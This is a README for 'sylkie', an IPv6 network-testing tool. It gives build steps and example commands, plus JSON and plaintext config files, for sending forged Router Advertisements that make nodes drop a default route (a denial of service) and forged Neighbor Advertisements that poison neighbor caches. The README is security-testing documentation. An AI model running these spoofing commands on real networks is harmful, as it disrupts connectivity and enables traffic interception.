# `sylkie` 

[![Travis Build Status](https://img.shields.io/travis/dlrobertson/sylkie/master.svg?label=master%20build)](https://travis-ci.org/dlrobertson/sylkie)

A command line tool and library for testing networks for common address
spoofing security vulnerabilities in IPv6 networks using the Neighbor
Discovery Protocol.

## Getting Started

**Note:** This project is still in the early phases of development. If you run into any problems,
please consider submitting an [issue](https://github.com/dlrobertson/sylkie/issues). It currently
only runs on Linux.

### Dependencies

 - [libseccomp](https://github.com/seccomp/libseccomp) (Optional, but highly recommended)
 - [json-c](https://github.com/json-c/json-c) (Optional, but recommended)

See [The Wiki](https://github.com/dlrobertson/sylkie/wiki#building) for more details.

### Build

Get the code and compile it!

```
# Get the code
git clone https://github.com/dlrobertson/sylkie
cd ./sylkie

# Compile the code
mkdir -p ./build
cd ./build
cmake -DCMAKE_BUILD_TYPE=Release ..
make
make install
```

## Basic usage

The following describes the basic usage of `sylkie`. Run `sylkie -h` or
`sylkie <subcommand> -h` for more details or check out
[Advanced Usage](https://github.com/dlrobertson/sylkie/wiki#advanced-usage)
for more examples.

### DoS (Router Advert)

The basic usage of the `router-advert` command is listed below. This
command will send a Router Advertisement message to the given ip or the
all nodes multicast addres causing the targeted nodes to remove
`<router-ip>/<prefix>` from their list of default routes.

```
sylkie ra -i <interface> \
    --target-mac <mac of router> \
    --router-ip <ip of router> \
    --prefix <router prefix> \
    --timeout <time between adverts> \
    --repeat <number of times to send the request>
```

#### Router Advert Examples

A basic example.

```
sylkie ra -i ens3 \
    --target-mac 52:54:00:e3:f4:06 \
    --router-ip fe80::b95b:ee1:cafe:9720 \
    --prefix 64 \
    --repeat -1 \
    --timeout 10
```

This would send a "forged" Router Advertisement to the link local scope
all-nodes address `ff02::1` causing all of the nodes to remove
`fe80::b95b:ee1:cafe:9720/64` (link-layer address `52:54:00:e3:f4:06`)
from their list of default routes.

### Address spoofing (Neighbor Advert)

The basic usage of the sylkie neighbor advert command is listed below.
This command will send a forged Neighbor Advertisement message to the
given ip.

```
sylkie na -i <interface> \
    --dst-mac <dest hw addr> \
    --src-ip <source ip> \
    --dst-ip <dest ip address> \
    --target-ip <target ip address> \
    --target-mac <target mac address> \
    --timeout <time betweeen adverts> \
    --repeat <number of times to send the request>
```

#### Neighbor Advert examples

A basic example

```
sylkie na -i ens3 \
    --dst-mac 52:54:00:e3:f4:06 \
    --src-ip fe80::61ad:fda3:3032:f6f4 \
    --dst-ip fe80::b95b:ee1:cafe:9720 \
    --target-ip fe80::61ad:fda3:3032:f6f4 \
    --target-mac 52:54:00:c2:a7:7c \
    --repeat -1 \
    --timeout 3
```

This would send a "forged" Neighbor Advertisement message to `dst-ip`
(`fe80::b95b:ee1:cafe:9720`), causing the hardware address in the neighbor
cache for the `target-ip` (`fe80::61ad:fda3:3032:f6f4`) to be updated to
the `target-mac` (`52:54:00:c2:a7:7c`).

## Saving your work

The commands above require quite a bit of info. To make life easier `sylkie`
also accepts json and plaintext files containing the necessary info to start
sending the forged advertisments.

### JSON

The subcommand (`router-advert`, `neighbor-advert`) is a key whos
value is an array of objects with the keys and values being the
corresponding option and value. To run the command, pass the
path to the json file as the argument to the `-j` option.

#### Example

To run the `router-advert` example provided above from json, first create
a file with the following.

```
{
    "router-advert": [
        {
            "interface": "ens3",
            "target-mac": "52:54:00:e3:f4:06",
            "router-ip": "fe80::b95b:ee1:cafe:9720",
            "prefix": 64,
            "repeat": -1,
            "timeout": 10
        }
    ]
}
```

After creating the file, start sending adverts with the following.

```
sylkie -j /path/to/json
```

### Plaintext

Each line of the file must be exactly what you would provide via
the command line minus the `sylkie` command.

#### Example

To run the `neighbor-advert` example provided above from json, first create
a file with the following.

```
na -i ens3 --dst-mac 52:54:00:e3:f4:06 --src-ip fe80::61ad:fda3:3032:f6f4 --dst-ip fe80::b95b:ee1:cafe:9720 --target-ip fe80::61ad:fda3:3032:f6f4 --target-mac 52:54:00:c2:a7:7c --repeat -1 --timeout 3
```

After creating the file, start sending the adverts with

```
sylkie -x /path/to/file
```
